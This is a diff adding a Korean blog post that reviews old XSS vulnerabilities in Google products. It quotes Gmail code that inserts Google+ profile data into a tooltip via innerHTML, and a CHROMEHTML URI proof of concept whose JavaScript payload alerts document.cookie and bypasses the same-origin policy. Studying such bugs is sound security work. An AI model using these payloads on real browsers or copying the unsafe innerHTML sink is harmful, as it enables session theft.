@@ -1,0 +1,53 @@
+---
+layout: post
+title: "Gmail XSS - 2012"
+date: 2014-04-23 09:29:16 +0900
+comments: true
+categories: 
+---
+
+Google 프로덕트에서 발견된 대표적인 XSS 취약점들을 리뷰해본다.
+
+### [Google Mail Hacking - Gmail Stored XSS - 2012!](http://www.benhayak.com/2012/06/google-mail-hacking-gmail-stored-xss.html)
+
+    // This Gmail Code was creating a Tool-tip that included 
+    // profile circles information that comes from 
+    // your Google Plus friend's account, 
+    // if they used a payload, 
+    // your mail account would have been at a serious risk.
+
+    zk.prototype.Ca = function $pn(a,c,d) {
+        this.xa = 0;
+        if (!this.ea) {
+            // ...
+            var e = this.Bb.zb().body, g = this.ea.va();
+            // ...
+            e.wa = h
+        }
+        a: {
+            if (d)
+                switch (d.toLowerCase().split(",")[1]) {
+                    case "l":
+                        break a;
+                    case "r":
+                        // ...
+                        break a
+                }
+            e = 2;
+        }
+        this.wa.setPosition(cka(d),e,i,-1);
+        jc(this.ea.va(), "T-ays-avH");
+        ud(this.ea.va(), 0, 0);
+        this.ea.Mc().innerHTML = c; // c = Data from Google+
+        this.wa.To(a);
+        this.wa.Me(k, 0);
+    };
+
+정리하면 위 코드는 Google+ 친구의 프로파일 정보를 Tool-tip 의 innerHTML 에 장착한다. 결국 친구 프로파일을 보여주는 Tool-tip 이 뜨는 순간, 내 브라우저에 payload 가 실행될 수 있다는 것.
+
+### ["CHROMEHTML" URI Vulnerability](http://blog.watchfire.com/files/google-chrome-advisory.doc)
+
+    var sneaky = 'setTimeout("alert(document.cookie);", 4000);document.location.assign("http://www.gmail.com");';
+    document.location = 'chromehtml:"80%20javascript:document.write(sneaky)"';
+
+chromehtml: uri handler 를 통해서 javascript 을 수행시키고, setTimeout() 을 통해 SOP 를 바이패스한다. 
